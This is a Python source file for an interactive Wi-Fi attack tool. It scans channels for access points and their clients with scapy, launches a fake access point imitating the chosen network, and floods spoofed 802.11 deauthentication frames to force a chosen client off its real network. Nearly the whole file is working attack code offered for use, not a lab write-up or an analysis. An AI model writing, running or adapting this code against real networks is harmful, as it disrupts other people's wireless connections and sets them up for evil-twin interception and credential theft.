import os
import sys
import colorama
from colorama import Fore
import time
from datetime import datetime
from run import print_errors, print_header, print_regular, print_sub_header, switch_to_monitor_mode, switch_to_managed_mode
import run
from string import Template
from scapy.all import *
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
import fakeAP

colorama.init()


class Attack:

    ap_list = []
    client_list = []
    
    target_ap = "none" # the target AP as a tuple: [ssid, mac, channel]
    client_target = "none"
    wlan_interface = "none"
    fake_ap_interface = "none"

    def __init__(self) -> None:
        
        os.system("service NetworkManager stop")
        os.system("airmon-ng check kill")

        #os.system("clear")

        print_sub_header("initing attack")

        print(Fore.RESET + "")

        iwconfig_output = os.popen('iwconfig').read()
        print(iwconfig_output)

        result = False
        while result == False:
            sniffer_w = input(Fore.YELLOW + "[*] Enter sniffer interface name: ")
            if sniffer_w in iwconfig_output:
                self.wlan_interface = sniffer_w
                result = True
            else:
                print_errors("{*] You entered an invalid name. Please try again.")

        result = False
        while result == False:
            sniffer_w = input(Fore.YELLOW + "[*] Enter fake ap interface name: ")
            if sniffer_w in iwconfig_output:
                self.fake_ap_interface = sniffer_w
                result = True
            else:
                print_errors("{*] You entered an invalid name. Please try again.")

        print(Fore.YELLOW + "[*] switching {} to monitor mode".format(self.wlan_interface))
        switch_to_monitor_mode(self.wlan_interface)

    def handle_network_packet(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            mac = pkt[Dot11].addr2.upper()
            if mac not in [x[1] for x in self.ap_list[0:]]:
                stats = pkt[Dot11Beacon].network_stats()
                channel = stats.get("channel")
                self.ap_list.append([ssid, mac, channel])
                print_regular(Fore.GREEN + '(+) Found new Access Point : SSID = {} , MAC = {}'.format(ssid, mac))

    def network_search(self, duration: int = 2):
        print(Fore.YELLOW + "[*] starting to sniff for networks")

        channel = 0
        for channel in range(1, 14):
            os.system("iwconfig " + self.wlan_interface + " channel " + str(channel))

            print(Fore.YELLOW + "[*] Sniffing channel {} for {} seconds...".format(channel, duration))
            sniff(timeout=duration, iface=self.wlan_interface, prn=self.handle_network_packet)
    
        print("\n[*] Wi-Fi Networks:")
        
        if len(self.ap_list) > 0:
            counter = 0
            for network in self.ap_list:
                print("\n[{}] SSID: ".format(counter) + network[0] + " mac: " + network[1])
                counter += 1
            while True:
                user_input = input(Fore.YELLOW + "\n[*] Please enter the index of the target network or Rescan: ")
                if len(user_input) > 0:
                    if user_input == "Rescan":
                        return self.network_search()
                    elif int(user_input) in range(0, counter):
                        self.target_ap = self.ap_list[int(user_input)]
                        return self.target_ap
                    else:
                        print(Fore.RED + "Invalid option. please choose a valid index")
                else:
                    print(Fore.RED + "Invalid option. please choose a valid index")
        else:
            user_input = input(Fore.RED + "[!] No Networks were found, for rescan type \'Rescan\', to quit type \'quit\' \n")
            if user_input == "Rescan":
                return self.network_search()
            elif user_input == "quit":
                run.restart(self.fake_ap_interface, self.wlan_interface)
                sys.exit()

    def client_search(self, AP, duration: int = 2):
        
        global ap_mac 
        ap_mac = self.target_ap[1].lower()

        for channel in range(1, 14):
            duration = 2
            if self.target_ap[2] - 1 <= channel <= self.target_ap[2] + 1:
                duration = 5
            os.system("iwconfig " + self.wlan_interface + " channel " + str(channel))

            print(Fore.YELLOW + "[*] Sniffing channel {} for {} seconds...".format(channel, duration))
            sniff(timeout=duration, iface=self.wlan_interface, prn=self.handle_client_packet)

        print("\nWi-Fi Clients:")
        counter = 0
        if len(self.client_list) > 0:
            for client in self.client_list:
                print("[{}] CLient mac = {}".format(counter, client))
                counter += 1          
        else:
            user_input = input(Fore.RED + "[!] No Clients were found, for rescan type \'Rescan\', to quit type \'quit\' \n")
            if user_input == "Rescan":
                return self.client_search()
            elif user_input == "quit":
                run.restart(self.fake_ap_interface, self.wlan_interface)
                sys.exit()

        flag = True
        while True:
            user_input = input(Fore.YELLOW + "\n[*] Please enter the index of the target CLient or Rescan: ")
            if len(user_input) > 0:
                if user_input == "Rescan":
                    return self.client_search(self.target_ap)
                elif int(user_input) in range(0, counter):
                    self.client_target = self.client_list[int(user_input)]
                    return self.client_target
                else:
                    print(Fore.RED + "Invalid option. please choose a valid index")
            else:
                print(Fore.RED + "Invalid option. please choose a valid index")

    def handle_client_packet(self, pkt):
        #print("pkt.addr2 = {} ap_mac = {} , pkt.addr1 = {}, pkt.addr3 = {}".format(pkt.addr2, ap_mac, pkt.addr1, pkt.addr3))
        try:
            if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
                if pkt.addr1 not in self.client_list:
                    if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                        # Add the new found client to the client list
                        print_regular(Fore.GREEN + '(+) Found new Client : MAC = {}'.format(pkt.addr1))
                        self.client_list.append(pkt.addr1)
        except AttributeError:
            return


    def create_fakeAP(self):
        if self.fake_ap_interface == "none" or self.target_ap == "none":
            print(Fore.RED + "[!] please choose first the target AP and the fake AP interface name")
            run.restart(self.fake_ap_interface, self.wlan_interface)
            sys.exit()
        fake_ap = fakeAP.fakeAP(self.fake_ap_interface, self.target_ap[0], self.wlan_interface)
    
    def deauth2(self, target_client_mac, ap_mac, sniffer):
        '''
            RadioTap()/Dot11(...)/Dot11Deauth() 
            addr1: destination MAC address
            addr2: source MAC address
            addr3: BSSID - AP MAC address
            RadioTap is making it easier to transmit information between OSI layers
            Dot11 represent the MAC header in the Data Link Layer, it is the abbreviated specification name 802.11
            Dot11Deauth represent deauthentication packet
            / - operator that used as a composition operator between two layers
        '''
        os.system("iwconfig " + self.wlan_interface + " channel " + str(ap_mac[2]))
        print(Fore.YELLOW + "[*] Attacking on channel {} ".format(ap_mac[2]))

        ap_mac = ap_mac.lower()
        # Deauthentication packet from AP to client.
        pkt_to_c = RadioTap()/Dot11(addr1=target_client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()

        # Deauthentication packet from client to AP.
        pkt_to_ap = RadioTap()/Dot11(addr1=ap_mac, addr2=target_client_mac, addr3=ap_mac)/Dot11Deauth()
        print("pkt_to_c = {} {} {}".format(pkt_to_c.addr1, pkt_to_c.addr2, pkt_to_c.addr3))
        print("pkt_to_ap = {} {} {}".format(pkt_to_ap.addr1, pkt_to_ap.addr2, pkt_to_ap.addr3))
        global counter
        counter = 0
        while counter < 100:
            print("pkt_to_c = {} {} {}".format(pkt_to_c.addr1, pkt_to_c.addr2, pkt_to_c.addr3))
            print("pkt_to_ap = {} {} {}".format(pkt_to_ap.addr1, pkt_to_ap.addr2, pkt_to_ap.addr3))
            counter += 1
            for i in range(50):
                
                ### The sendp() function send packets at layer 2 - Data Link Layer
                # Sending deauthentication packet from AP to client.
                print ("Sending deauthentication packet from AP to client")
                # sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
                sendp(pkt_to_c, iface=sniffer)
                
                # Sending deauthentication packet from client to AP.
                print ("Sending deauthentication packet from client to AP")
                # sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
                sendp(pkt_to_ap, iface=sniffer)

                # target_mac = target_client_mac
                # gateway_mac = "c0:ac:54:f7:b0:02"
                # # 802.11 frame
                # # addr1: destination MAC
                # # addr2: source MAC
                # # addr3: Access Point MAC
                # dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
                # # stack them up
                # packet = RadioTap()/dot11/Dot11Deauth(reason=7)
                # # send the packet
                # sendp(packet, inter=.2, count=10000, iface=sniffer, verbose=1)

    def deauth(self, target_mac, gateway_mac, iface):
        output = input(Fore.YELLOW + "[*] To start the de-authentication attack on {} type ok or quit: ".format(self.client_target) )
        if output == 'ok':
            os.system("iwconfig " + self.wlan_interface + " channel " + str(self.target_ap[2]))
            print(Fore.YELLOW + "[*] Attacking on channel of {} (channel {}) ".format(self.target_ap[0], self.target_ap[2]))
            # 802.11 frame
            # addr1: destination MAC
            # addr2: source MAC
            # addr3: Access Point MAC
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            # stack them up
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            # send the packet
            sendp(packet,  count=10000, iface=iface,loop=2)
        elif output == 'quit':
            restart(self.fake_ap_interface, self.wlan_interface)
            sys.exit()
        else:
            print(Fore.RED + "Invalid input please try again")
            self.deauth(target_mac, gateway_mac, iface)

        
